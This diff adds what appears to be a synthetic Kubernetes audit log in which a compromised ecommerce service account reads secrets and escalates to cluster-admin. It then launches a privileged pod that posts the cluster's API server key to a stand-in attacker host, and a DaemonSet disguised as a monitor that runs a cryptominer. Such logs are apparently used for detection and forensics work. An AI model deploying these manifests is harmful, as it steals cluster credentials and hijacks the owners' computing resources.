@@ -1,0 +1,856 @@
+[
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000001",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes/node-1?timeout=10s",
+    "verb": "get",
+    "user": {
+      "username": "system:node:node-1",
+      "groups": ["system:nodes", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.10"],
+    "userAgent": "kubelet/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "nodes",
+      "name": "node-1",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:15:00.123456Z",
+    "stageTimestamp": "2024-03-15T10:15:00.134567Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"system:node\" of ClusterRole \"system:node\" to Group \"system:nodes\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000002",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/endpoints?limit=500",
+    "verb": "list",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "endpoints",
+      "namespace": "ecommerce",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:15:05.234567Z",
+    "stageTimestamp": "2024-03-15T10:15:05.245678Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000003",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/services/db-svc",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "webapp/2.1.0 (go-http-client)",
+    "objectRef": {
+      "resource": "services",
+      "namespace": "ecommerce",
+      "name": "db-svc",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:16:00.345678Z",
+    "stageTimestamp": "2024-03-15T10:16:00.356789Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000004",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:monitoring:prometheus-sa",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:monitoring", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.3.5"],
+    "userAgent": "prometheus/2.48.0",
+    "objectRef": {
+      "resource": "nodes",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:16:30.456789Z",
+    "stageTimestamp": "2024-03-15T10:16:30.467890Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000005",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes/node-2?timeout=10s",
+    "verb": "get",
+    "user": {
+      "username": "system:node:node-2",
+      "groups": ["system:nodes", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.11"],
+    "userAgent": "kubelet/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "nodes",
+      "name": "node-2",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:17:00.567890Z",
+    "stageTimestamp": "2024-03-15T10:17:00.578901Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000006",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/endpoints/webapp-svc",
+    "verb": "update",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "endpoints",
+      "namespace": "ecommerce",
+      "name": "webapp-svc",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:18:00.678901Z",
+    "stageTimestamp": "2024-03-15T10:18:00.689012Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000007",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/configmaps/webapp-config",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "webapp/2.1.0 (go-http-client)",
+    "objectRef": {
+      "resource": "configmaps",
+      "namespace": "ecommerce",
+      "name": "webapp-config",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:19:00.789012Z",
+    "stageTimestamp": "2024-03-15T10:19:00.800123Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000008",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/kube-system/configmaps/kube-proxy",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:kube-system:kube-proxy",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:kube-system", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.10"],
+    "userAgent": "kube-proxy/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "configmaps",
+      "namespace": "kube-system",
+      "name": "kube-proxy",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:20:00.890123Z",
+    "stageTimestamp": "2024-03-15T10:20:00.901234Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000009",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/metrics.k8s.io/v1beta1/nodes",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:monitoring:prometheus-sa",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:monitoring", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.3.5"],
+    "userAgent": "prometheus/2.48.0",
+    "objectRef": {
+      "resource": "nodes",
+      "apiGroup": "metrics.k8s.io",
+      "apiVersion": "v1beta1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:21:00.901234Z",
+    "stageTimestamp": "2024-03-15T10:21:00.912345Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000010",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces",
+    "verb": "list",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "namespaces",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:22:00.012345Z",
+    "stageTimestamp": "2024-03-15T10:22:00.023456Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "namespaces",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:23:17.234567Z",
+    "stageTimestamp": "2024-03-15T10:23:17.289012Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000011",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/events?limit=500",
+    "verb": "list",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "events",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:23:30.345678Z",
+    "stageTimestamp": "2024-03-15T10:23:30.356789Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "b2c3d4e5-f6a7-8901-bcde-f12345678901",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/secrets",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "secrets",
+      "namespace": "ecommerce",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:23:45.456789Z",
+    "stageTimestamp": "2024-03-15T10:23:45.501234Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "c3d4e5f6-a7b8-9012-cdef-123456789012",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/secrets/db-credentials",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "secrets",
+      "namespace": "ecommerce",
+      "name": "db-credentials",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:24:02.567890Z",
+    "stageTimestamp": "2024-03-15T10:24:02.612345Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "d4e5f6a7-b8c9-0123-defa-234567890123",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/secrets/payment-gateway-key",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "secrets",
+      "namespace": "ecommerce",
+      "name": "payment-gateway-key",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:24:18.678901Z",
+    "stageTimestamp": "2024-03-15T10:24:18.723456Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "e5f6a7b8-c9d0-1234-efab-345678901234",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterroles",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "clusterroles",
+      "apiGroup": "rbac.authorization.k8s.io",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:24:55.789012Z",
+    "stageTimestamp": "2024-03-15T10:24:55.834567Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000012",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes/node-1?timeout=10s",
+    "verb": "get",
+    "user": {
+      "username": "system:node:node-1",
+      "groups": ["system:nodes", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.10"],
+    "userAgent": "kubelet/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "nodes",
+      "name": "node-1",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:25:00.890123Z",
+    "stageTimestamp": "2024-03-15T10:25:00.901234Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "f6a7b8c9-d0e1-2345-fabc-456789012345",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "clusterrolebindings",
+      "name": "system-controller-manager-extension",
+      "apiGroup": "rbac.authorization.k8s.io",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 201},
+    "requestReceivedTimestamp": "2024-03-15T10:25:33.901234Z",
+    "stageTimestamp": "2024-03-15T10:25:33.956789Z",
+    "requestObject": {
+      "kind": "ClusterRoleBinding",
+      "apiVersion": "rbac.authorization.k8s.io/v1",
+      "metadata": {
+        "name": "system-controller-manager-extension"
+      },
+      "roleRef": {
+        "apiGroup": "rbac.authorization.k8s.io",
+        "kind": "ClusterRole",
+        "name": "cluster-admin"
+      },
+      "subjects": [
+        {
+          "kind": "ServiceAccount",
+          "name": "webapp-sa",
+          "namespace": "ecommerce"
+        }
+      ]
+    },
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "a7b8c9d0-e1f2-3456-abcd-567890123456",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/kube-system/pods",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "kube-system",
+      "name": "log-collector-node-agent",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 201},
+    "requestReceivedTimestamp": "2024-03-15T10:26:01.012345Z",
+    "stageTimestamp": "2024-03-15T10:26:01.067890Z",
+    "requestObject": {
+      "kind": "Pod",
+      "apiVersion": "v1",
+      "metadata": {
+        "name": "log-collector-node-agent",
+        "namespace": "kube-system",
+        "labels": {
+          "app": "log-collector",
+          "component": "node-agent"
+        }
+      },
+      "spec": {
+        "hostNetwork": true,
+        "hostPID": true,
+        "containers": [
+          {
+            "name": "collector",
+            "image": "alpine:3.19",
+            "command": ["/bin/sh", "-c", "apk add --no-cache curl && while true; do cat /host-pki/ca.crt /host-pki/apiserver.key | curl -X POST -d @- https://exfil.attacker.example.com/collect; sleep 3600; done"],
+            "volumeMounts": [
+              {
+                "name": "host-pki",
+                "mountPath": "/host-pki",
+                "readOnly": true
+              }
+            ],
+            "securityContext": {
+              "privileged": true
+            }
+          }
+        ],
+        "volumes": [
+          {
+            "name": "host-pki",
+            "hostPath": {
+              "path": "/etc/kubernetes/pki",
+              "type": "Directory"
+            }
+          }
+        ]
+      }
+    },
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"system-controller-manager-extension\" of ClusterRole \"cluster-admin\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000013",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/kube-system/pods/log-collector-node-agent/binding",
+    "verb": "create",
+    "user": {
+      "username": "system:kube-scheduler",
+      "groups": ["system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-scheduler/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "kube-system",
+      "name": "log-collector-node-agent",
+      "apiVersion": "v1",
+      "subresource": "binding"
+    },
+    "responseStatus": {"metadata": {}, "code": 201},
+    "requestReceivedTimestamp": "2024-03-15T10:26:15.123456Z",
+    "stageTimestamp": "2024-03-15T10:26:15.134567Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "b8c9d0e1-f2a3-4567-bcde-678901234567",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/apps/v1/namespaces/monitoring/daemonsets",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "curl/8.5.0",
+    "objectRef": {
+      "resource": "daemonsets",
+      "namespace": "monitoring",
+      "name": "node-health-monitor",
+      "apiGroup": "apps",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 201},
+    "requestReceivedTimestamp": "2024-03-15T10:26:45.234567Z",
+    "stageTimestamp": "2024-03-15T10:26:45.289012Z",
+    "requestObject": {
+      "kind": "DaemonSet",
+      "apiVersion": "apps/v1",
+      "metadata": {
+        "name": "node-health-monitor",
+        "namespace": "monitoring",
+        "labels": {
+          "app": "node-health-monitor",
+          "component": "monitoring"
+        }
+      },
+      "spec": {
+        "selector": {
+          "matchLabels": {
+            "app": "node-health-monitor"
+          }
+        },
+        "template": {
+          "metadata": {
+            "labels": {
+              "app": "node-health-monitor"
+            }
+          },
+          "spec": {
+            "containers": [
+              {
+                "name": "monitor",
+                "image": "docker.io/cryptopool/xmrig:latest",
+                "resources": {
+                  "requests": {
+                    "cpu": "2000m",
+                    "memory": "2Gi"
+                  }
+                },
+                "env": [
+                  {
+                    "name": "POOL_URL",
+                    "value": "stratum+tcp://pool.minexmr.com:4444"
+                  },
+                  {
+                    "name": "WALLET",
+                    "value": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRgp"
+                  }
+                ]
+              }
+            ],
+            "tolerations": [
+              {
+                "operator": "Exists"
+              }
+            ]
+          }
+        }
+      }
+    },
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"system-controller-manager-extension\" of ClusterRole \"cluster-admin\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000014",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes/node-1/status",
+    "verb": "patch",
+    "user": {
+      "username": "system:node:node-1",
+      "groups": ["system:nodes", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.10"],
+    "userAgent": "kubelet/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "nodes",
+      "name": "node-1",
+      "apiVersion": "v1",
+      "subresource": "status"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:28:00.345678Z",
+    "stageTimestamp": "2024-03-15T10:28:00.356789Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000015",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/apps/v1/namespaces/ecommerce/deployments",
+    "verb": "list",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "deployments",
+      "namespace": "ecommerce",
+      "apiGroup": "apps",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:29:00.456789Z",
+    "stageTimestamp": "2024-03-15T10:29:00.467890Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000016",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/services/db-svc",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ecommerce:webapp-sa",
+      "uid": "sa-uid-webapp-001",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:ecommerce", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.1.8"],
+    "userAgent": "webapp/2.1.0 (go-http-client)",
+    "objectRef": {
+      "resource": "services",
+      "namespace": "ecommerce",
+      "name": "db-svc",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:30:00.567890Z",
+    "stageTimestamp": "2024-03-15T10:30:00.578901Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"webapp-full-access-binding\" of ClusterRole \"webapp-full-access\" to ServiceAccount \"webapp-sa/ecommerce\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000017",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ecommerce/pods",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:monitoring:prometheus-sa",
+      "groups": ["system:serviceaccounts", "system:serviceaccounts:monitoring", "system:authenticated"]
+    },
+    "sourceIPs": ["10.244.3.5"],
+    "userAgent": "prometheus/2.48.0",
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "ecommerce",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:31:00.678901Z",
+    "stageTimestamp": "2024-03-15T10:31:00.689012Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000018",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/nodes/node-2/status",
+    "verb": "patch",
+    "user": {
+      "username": "system:node:node-2",
+      "groups": ["system:nodes", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.11"],
+    "userAgent": "kubelet/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "nodes",
+      "name": "node-2",
+      "apiVersion": "v1",
+      "subresource": "status"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:32:00.789012Z",
+    "stageTimestamp": "2024-03-15T10:32:00.800123Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f1a20001-aaaa-4000-b000-000000000019",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/monitoring/endpoints/prometheus-svc",
+    "verb": "update",
+    "user": {
+      "username": "system:kube-controller-manager",
+      "groups": ["system:masters", "system:authenticated"]
+    },
+    "sourceIPs": ["192.168.1.1"],
+    "userAgent": "kube-controller-manager/v1.29.2 (linux/amd64)",
+    "objectRef": {
+      "resource": "endpoints",
+      "namespace": "monitoring",
+      "name": "prometheus-svc",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"metadata": {}, "code": 200},
+    "requestReceivedTimestamp": "2024-03-15T10:33:00.890123Z",
+    "stageTimestamp": "2024-03-15T10:33:00.901234Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow"
+    }
+  }
+]
